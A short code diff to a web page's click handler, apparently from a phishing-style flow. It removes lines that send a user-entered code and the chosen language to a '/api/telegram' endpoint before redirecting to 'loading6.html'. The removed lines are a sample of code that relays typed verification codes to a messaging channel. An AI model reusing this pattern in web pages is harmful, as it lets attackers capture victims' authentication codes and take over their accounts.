@@ -335,17 +335,7 @@ btn.addEventListener("click", async () => {
     codeEl.focus();
     return;
   }
-  const code = codeEl.value;
 
-  await fetch("/api/telegram", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      message:
-        `🔐 Code:\n${code}\n\n` +
-        `🌐 Sprache:\n${current}`
-    })
-  });
   window.location.href = "loading6.html"
 });
 
